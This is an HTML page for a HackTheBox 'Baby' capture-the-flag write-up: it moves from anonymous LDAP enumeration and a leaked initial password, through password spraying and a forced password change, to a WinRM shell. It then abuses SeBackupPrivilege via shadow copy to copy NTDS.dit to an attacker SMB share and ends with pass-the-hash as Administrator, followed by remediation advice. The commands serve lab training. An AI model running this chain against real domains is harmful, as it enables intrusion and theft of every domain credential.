@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Baby - HackTheBox writeup</title>
+<meta name="description" content="HackTheBox Baby (Easy, Windows/Active Directory): anonymous LDAP enumeration leaks an initial password, a forced password change gives a WinRM foothold, and SeBackupPrivilege is abused via a shadow copy to extract NTDS.dit and Pass-the-Hash as Administrator.">
+<link rel="canonical" href="https://sudoanthony.github.io/writeup-baby.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="~/sudoanthony">
+<meta property="og:title" content="Baby - HackTheBox (Easy, Windows/AD)">
+<meta property="og:description" content="Anonymous LDAP leaks an initial password, a forced password change gives a WinRM foothold, and SeBackupPrivilege is abused to extract NTDS.dit and Pass-the-Hash as Administrator.">
+<meta property="og:url" content="https://sudoanthony.github.io/writeup-baby.html">
+<meta property="og:image" content="https://sudoanthony.github.io/images/baby-og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Baby - HackTheBox (Easy, Windows/AD)">
+<meta name="twitter:description" content="LDAP enum, forced password change to a WinRM foothold, then SeBackupPrivilege abused to extract NTDS.dit and Pass-the-Hash to Administrator.">
+<meta name="twitter:image" content="https://sudoanthony.github.io/images/baby-og.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="nav"><div class="wrap">
+  <a class="brand" href="index.html">~/sudoanthony</a>
+  <div class="links">
+    <a href="writeups.html">write-ups</a>
+    <a href="vulns.html">vulns</a>
+    <a href="concepts.html">concepts</a>
+    <a href="tools.html">tools</a>
+    <a href="https://github.com/sudoanthony">github</a>
+  </div>
+</div></nav>
+
+<main class="wrap" style="padding-top:44px">
+
+  <div class="wu-head">
+    <img class="wu-icon" src="images/icons/baby.png" alt="" onerror="this.style.display='none'">
+    <h1>Baby</h1>
+  </div>
+
+  <div class="meta">
+    <span class="badge htb">HackTheBox</span>
+    <span class="badge easy">Easy</span>
+    <span class="badge red-team">red team</span>
+    <span class="sep">|</span>
+    <span>Windows &middot; Active Directory</span>
+    <span class="sep">|</span>
+    <span>10 Oct 2026</span>
+  </div>
+
+  <div class="tldr">
+    <span class="lbl">tl;dr</span>
+    <p>Baby is an easy Windows Active Directory box. Anonymous LDAP enumeration leaks an initial
+    password in a user's <code>description</code> field. That password won't log in directly because the
+    account is flagged "must change at next logon", so we change it ourselves and use the new credentials
+    to get a WinRM shell as a low-privileged user. That user sits in <strong>Backup Operators</strong> and
+    holds <code>SeBackupPrivilege</code>, which we abuse by creating a Volume Shadow Copy and copying
+    <code>NTDS.dit</code> (the AD database) plus the <code>SYSTEM</code> hive out in backup mode. Offline,
+    <code>secretsdump</code> extracts every domain hash, and a Pass-the-Hash with the Administrator NT hash
+    lands a full Administrator shell.</p>
+  </div>
+
+  <div class="tags">
+    <a class="tag" href="vulns.html#ldap-anon-enum">ldap-anon-enum</a>
+    <a class="tag" href="vulns.html#exposed-credentials">exposed-credentials</a>
+    <a class="tag" href="vulns.html#password-must-change">password-must-change</a>
+    <a class="tag" href="vulns.html#sebackupprivilege">sebackupprivilege</a>
+    <a class="tag" href="vulns.html#pass-the-hash">pass-the-hash</a>
+    <a class="tag" href="vulns.html#priv-esc">priv-esc</a>
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">heads-up: the target IP changes mid-writeup</span>
+    This box was more frustrating to finish than anticipated because it kept disconnecting for me. I'm not
+    sure if it was because of my location, but I haven't had this much trouble with a box before. You'll
+    notice the IP changes throughout the write-up (early recon was against <code>10.129.53.98</code>; after a
+    reset the box came back on <code>10.129.234.71</code>), but I tried to make everything feel connected
+    despite this.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 01 ==================== -->
+  <h2><span class="num">01</span>Enumeration</h2>
+
+  <p>Starting with a full port and service scan to see what we are working with:</p>
+  <pre><code><span class="p">$</span> nmap -sCV -p- -T4 --min-rate 5000 <span class="o">10.129.53.98</span></code></pre>
+  <figure><img src="images/Baby/baby03.png" alt="nmap results showing a Windows Server 2022 domain controller"><figcaption>Textbook domain controller: DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), kpasswd (464), WinRM (5985), ADWS (9389). Windows Server 2022, domain <code>baby.vl</code>, host <code>BABYDC</code>.</figcaption></figure>
+
+  <p>The ports tell the whole story: this is an Active Directory domain controller. The two that matter most
+  for a foothold are <strong>LDAP</strong> (enumerate the directory) and <strong>WinRM/5985</strong> (remote
+  shell once we have creds). <code>kpasswd</code> on 464 is also worth noting; it lets us change a password
+  over the network, which turns out to be the key to the foothold.</p>
+
+  <p>The scan already handed us the domain name (<code>baby.vl</code>) and the DC hostname
+  (<code>babydc.baby.vl</code>). Confirm them with a DNS lookup against the box, since a DC usually doubles
+  as the domain's DNS server:</p>
+  <pre><code><span class="p">$</span> dig ns baby.vl @<span class="o">10.129.53.98</span></code></pre>
+  <figure><img src="images/Baby/baby01.png" alt="dig NS record for baby.vl returning babydc.baby.vl"><figcaption>The domain <code>baby.vl</code> is served by <code>babydc.baby.vl</code>.</figcaption></figure>
+
+  <p>Add the domain and DC hostname to <code>/etc/hosts</code> so name-based tooling (Kerberos, LDAP) works:</p>
+  <figure><img src="images/Baby/baby07.png" alt="/etc/hosts updated with baby.vl and babydc.baby.vl"><figcaption><code>/etc/hosts</code> pointing <code>baby.vl</code> and <code>babydc.baby.vl</code> at the target.</figcaption></figure>
+
+  <h3>Anonymous LDAP enumeration</h3>
+
+  <p>Many AD environments allow anonymous (unauthenticated) LDAP binds that leak the whole directory. Dump
+  it and look for anything interesting:</p>
+  <pre><code><span class="p">$</span> ldapsearch -x -H ldap://<span class="o">10.129.53.98</span> -b "DC=baby,DC=vl" "(objectClass=user)"</code></pre>
+  <figure><img src="images/Baby/baby04.png" alt="LDAP dump showing Teresa Bell with an initial password in the description field"><figcaption>The jackpot: Teresa Bell's object has <code>description: Set initial password to BabyStart123!</code></figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">why this is the finding</span>
+    Admins sometimes stash a temporary or initial password in a user's <code>description</code> field as a
+    note to themselves. The problem is that the <code>description</code> attribute is <strong>world-readable</strong>
+    to anyone who can bind to LDAP, including an anonymous bind. Any secret you can read anonymously is not
+    a secret. This is the "exposed credentials" class of finding.
+  </div>
+
+  <p>Pull a clean list of every account name and save it for a password spray:</p>
+  <pre><code><span class="p">$</span> ldapsearch -x -H ldap://<span class="o">10.129.53.98</span> -b "DC=baby,DC=vl" "(objectClass=user)" sAMAccountName | grep -i "sAMAccountName:" | awk '{print $2}' > users.txt</code></pre>
+  <figure><img src="images/Baby/baby09.png" alt="ldapsearch returning the list of sAMAccountName values"><figcaption>The domain user list from LDAP.</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 02 ==================== -->
+  <h2><span class="num">02</span>Foothold - exposed password + forced change</h2>
+
+  <p>With the leaked password in hand, spray it across every account from the <code>sAMAccountName</code>
+  list we saved into <code>users.txt</code>. <code>netexec</code> (the successor to CrackMapExec) is perfect
+  for this:</p>
+  <pre><code><span class="p">$</span> nxc smb <span class="o">10.129.53.98</span> -u users.txt -p 'BabyStart123!' --continue-on-success</code></pre>
+  <figure><img src="images/Baby/baby10.png" alt="password spray against the user list returning login failures"><figcaption>Every account in <code>users.txt</code> comes back <code>STATUS_LOGON_FAILURE</code> - nothing in the spray succeeds.</figcaption></figure>
+
+  <p>Here's the catch, and it's the whole key to the box: one user, <strong>Caroline Robinson</strong>,
+  appeared in the broad LDAP dump earlier (an object in the same <code>it</code> OU as Teresa Bell) but
+  <em>never showed up in the <code>sAMAccountName</code> enumeration</em>, so she was never added to
+  <code>users.txt</code> and the spray never even tried her. That gap is the missing link. Testing her
+  manually tells a completely different story:</p>
+  <pre><code><span class="p">$</span> nxc smb <span class="o">10.129.53.98</span> -u 'Caroline.Robinson' -p 'BabyStart123!'</code></pre>
+  <figure><img src="images/Baby/baby11.png" alt="Caroline.Robinson returns STATUS_PASSWORD_MUST_CHANGE"><figcaption><code>STATUS_PASSWORD_MUST_CHANGE</code> - the password is <em>correct</em>, the account just can't log in until the password is changed.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">STATUS_PASSWORD_MUST_CHANGE vs STATUS_LOGON_FAILURE</span>
+    These two responses mean opposite things. <code>LOGON_FAILURE</code> = wrong password. <code>PASSWORD_MUST_CHANGE</code>
+    = <strong>right password</strong>, but the account is flagged "user must change password at next logon", so
+    the login is refused until a new password is set. That flag is meant to force a human to pick a new
+    password on first login, but it doesn't stop <em>us</em> from setting it over the network first.
+  </div>
+
+  <p>Change the password ourselves using <code>smbpasswd</code> in remote mode (supply the current
+  <code>BabyStart123!</code> as the old password, then a new one):</p>
+  <pre><code><span class="p">$</span> smbpasswd -r <span class="o">10.129.53.98</span> -U Caroline.Robinson</code></pre>
+  <figure><img src="images/Baby/baby13.png" alt="smbpasswd reports the password was changed for Caroline.Robinson"><figcaption>Password changed to <code>BabyStart1234!</code>. (The first attempt timed out when the box dropped - a retry worked.)</figcaption></figure>
+
+  <p>Confirm the new credentials are valid (this is where the box had reset, so the IP is now
+  <code>10.129.234.71</code>):</p>
+  <pre><code><span class="p">$</span> nxc smb <span class="o">10.129.234.71</span> -u 'Caroline.Robinson' -p 'BabyStart1234!'</code></pre>
+  <figure><img src="images/Baby/baby15.png" alt="netexec confirms Caroline.Robinson with the new password is valid"><figcaption>Green <code>[+]</code> - the new credentials authenticate.</figcaption></figure>
+
+  <p>WinRM (5985) was open, so grab a shell with <code>evil-winrm</code>:</p>
+  <pre><code><span class="p">$</span> evil-winrm -i <span class="o">10.129.234.71</span> -u Caroline.Robinson -p 'BabyStart1234!'</code></pre>
+  <figure><img src="images/Baby/baby16.png" alt="evil-winrm shell as Caroline.Robinson"><figcaption>Shell as <code>Caroline.Robinson</code>.</figcaption></figure>
+
+  <pre><code><span class="p">PS></span> cat ..\Desktop\user.txt</code></pre>
+  <figure><img src="images/Baby/baby18.png" alt="user.txt flag (redacted)"><figcaption>User flag - <code>user.txt</code> [redacted].</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 03 ==================== -->
+  <h2><span class="num">03</span>Privilege escalation - SeBackupPrivilege &rarr; NTDS.dit</h2>
+
+  <p>First thing on any Windows box: check privileges and group membership.</p>
+  <pre><code><span class="p">PS></span> whoami /priv
+<span class="p">PS></span> whoami /groups</code></pre>
+  <figure><img src="images/Baby/baby19.png" alt="whoami /priv showing SeBackupPrivilege enabled"><figcaption><code>SeBackupPrivilege</code> (and <code>SeRestorePrivilege</code>) are <strong>Enabled</strong>.</figcaption></figure>
+  <figure><img src="images/Baby/baby20.png" alt="whoami /groups showing BUILTIN\Backup Operators membership"><figcaption>Caroline is a member of <strong>BUILTIN\Backup Operators</strong> - which is where that privilege comes from.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">what SeBackupPrivilege is, and why it's game over on a DC</span>
+    <code>SeBackupPrivilege</code> grants <strong>read access to any file on the system</strong>, regardless
+    of its ACL, so that backup software can copy protected files. The catch: it's read for <em>any</em> file,
+    including the ones that hold credentials. On a domain controller the prize is <code>C:\Windows\NTDS\NTDS.dit</code>,
+    the Active Directory database containing <strong>every domain account's password hash</strong>. Pair it
+    with the <code>SYSTEM</code> registry hive (which holds the boot key needed to decrypt it) and you can
+    recover the whole domain offline. This isn't an exploit, it's an over-privileged group assignment being
+    used exactly as designed.
+  </div>
+
+  <p>Grab the <code>SYSTEM</code> hive first (that one isn't locked, so a plain <code>reg save</code> works):</p>
+  <pre><code><span class="p">PS></span> reg save HKLM\SYSTEM C:\Users\Caroline.Robinson\Desktop\system.hive</code></pre>
+  <figure><img src="images/Baby/baby21.png" alt="reg save of the SYSTEM hive succeeds"><figcaption>The <code>SYSTEM</code> hive saved to disk.</figcaption></figure>
+
+  <p><code>NTDS.dit</code> is trickier. It's a live database held open by AD, so a direct copy fails:</p>
+  <figure><img src="images/Baby/baby22.png" alt="robocopy of NTDS.dit fails because the file is in use"><figcaption>Copying the live file fails: "The process cannot access the file because it is being used by another process."</figcaption></figure>
+
+  <p>The standard answer is a <strong>Volume Shadow Copy</strong> (VSS): a frozen point-in-time snapshot of
+  the volume where the database file <em>isn't</em> locked. Built-in <code>diskshadow</code> creates one from
+  a small script, and because we have <code>SeBackupPrivilege</code>, <code>robocopy /b</code> (backup mode)
+  reads the file straight out of the snapshot, bypassing the ACL:</p>
+  <pre><code><span class="c"># diskshadow script (ds.txt) - create a persistent snapshot of C: and mount it as Z:</span>
+set context persistent nowriters
+set metadata C:\Windows\Temp\meta.cab
+add volume c: alias cdrive
+create
+expose %cdrive% z:</code></pre>
+  <figure><img src="images/Baby/baby26.png" alt="diskshadow creating a shadow copy and exposing it as Z, then robocopy of ntds.dit"><figcaption><code>diskshadow /s ds.txt</code> builds the snapshot and exposes it as <code>Z:</code>; <code>robocopy /b</code> then copies <code>NTDS.dit</code> out of it.</figcaption></figure>
+  <pre><code><span class="p">PS></span> diskshadow /s C:\Windows\Temp\ds.txt
+<span class="p">PS></span> robocopy /b Z:\Windows\NTDS C:\Users\Caroline.Robinson\Desktop ntds.dit</code></pre>
+
+  <p>Exfiltrate both files back to Kali (here, copied to an SMB share hosted on the attacking box):</p>
+  <pre><code><span class="p">PS></span> copy C:\Users\Caroline.Robinson\Desktop\ntds.dit  \\<span class="o">10.10.15.114</span>\share\ntds.dit
+<span class="p">PS></span> copy C:\Users\Caroline.Robinson\Desktop\system.hive \\<span class="o">10.10.15.114</span>\share\system.hive</code></pre>
+  <figure><img src="images/Baby/baby28.png" alt="ntds.dit and system.hive now present on the Kali box"><figcaption>Both files landed on Kali.</figcaption></figure>
+
+  <p>Now extract the hashes offline with Impacket's <code>secretsdump</code>, feeding it the NTDS database
+  and the SYSTEM hive for the boot key:</p>
+  <pre><code><span class="p">$</span> impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL</code></pre>
+  <figure><img src="images/Baby/baby29.png" alt="secretsdump dumping all domain NTLM hashes including Administrator"><figcaption>Every domain hash, including <code>Administrator:500:...:ee4457ae59f1e3fbd764e33d9cef123d:::</code></figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">Pass-the-Hash</span>
+    Windows NTLM authentication proves you know the password by proving you hold its <strong>NT hash</strong>,
+    and it never needs the plaintext. So once we have the Administrator NT hash from <code>NTDS.dit</code>, we
+    can authenticate <em>as</em> Administrator by passing the hash directly, no cracking required. <code>evil-winrm</code>
+    takes a hash with <code>-H</code> instead of a password with <code>-p</code>.
+  </div>
+
+  <pre><code><span class="p">$</span> evil-winrm -i <span class="o">10.129.234.71</span> -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d</code></pre>
+  <figure><img src="images/Baby/baby30.png" alt="evil-winrm shell as Administrator via pass-the-hash"><figcaption>Administrator shell, no password used - just the hash.</figcaption></figure>
+
+  <pre><code><span class="p">PS></span> cat ..\Desktop\root.txt</code></pre>
+  <figure><img src="images/Baby/baby31.png" alt="root.txt flag (redacted)"><figcaption>Root flag - <code>root.txt</code> [redacted]. Box owned.</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 04 ==================== -->
+  <h2><span class="num">04</span>Root cause &amp; remediation</h2>
+  <table style="width:100%; border-collapse:collapse; font-size:14.5px; margin:6px 0 8px">
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text); width:40%"><strong>Anonymous LDAP read</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">Disable anonymous/unauthenticated LDAP binds so the directory can't be dumped by anyone on the network.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Password in the description field</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">Never store passwords in AD attributes. Deliver initial passwords out-of-band, force a change on first logon, and audit descriptions for secrets.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Reused / weak initial password</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">The "must change" flag is not a control if the current password is known. Use unique, random initial passwords and short expiry windows.</td>
+      </tr>
+      <tr>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>SeBackupPrivilege on a standard user</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">Treat Backup Operators as equivalent to Domain Admin on a DC. Remove normal users from it, restrict backup rights to dedicated, monitored service accounts, and alert on shadow-copy creation and NTDS access.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <!-- ==================== 05 ==================== -->
+  <h2><span class="num">05</span>Takeaways</h2>
+  <p>Baby is a clean first look at an AD attack chain, and every link is a configuration mistake rather than
+  a CVE. The lesson that sticks: <strong>read everything you're allowed to read</strong>. An anonymous LDAP
+  bind handed over a password that an admin typed into a notes field, and the whole box unspooled from there.</p>
+  <p>The second lesson is reading responses carefully. A quick glance at the spray looked like total failure,
+  but <code>STATUS_PASSWORD_MUST_CHANGE</code> on one account was a flashing green light, not a wall. The
+  difference between that and <code>LOGON_FAILURE</code> was the entire foothold.</p>
+  <p>And the privesc is one worth filing away: on a domain controller, <code>SeBackupPrivilege</code> (or
+  membership in Backup Operators) equals Domain Admin, because it lets you read <code>NTDS.dit</code> and
+  recover every hash. The moment <code>whoami /priv</code> shows it, think "shadow copy the NTDS database".</p>
+
+  <p style="margin-top:32px">
+    <a href="writeups.html">&larr; all write-ups</a> &nbsp;&middot;&nbsp;
+    <a href="vulns.html">techniques used &rarr;</a>
+  </p>
+
+</main>
+
+<footer class="foot"><div class="wrap" style="display:flex;gap:18px;flex-wrap:wrap">
+  <a href="index.html">home</a>
+  <a href="writeups.html">write-ups</a>
+  <a href="vulns.html">vulns</a>
+  <a href="https://github.com/sudoanthony">github</a>
+</div></footer>
+
+<script src="writeup-toc.js"></script>
+<script src="lightbox.js"></script>
+</body>
+</html>
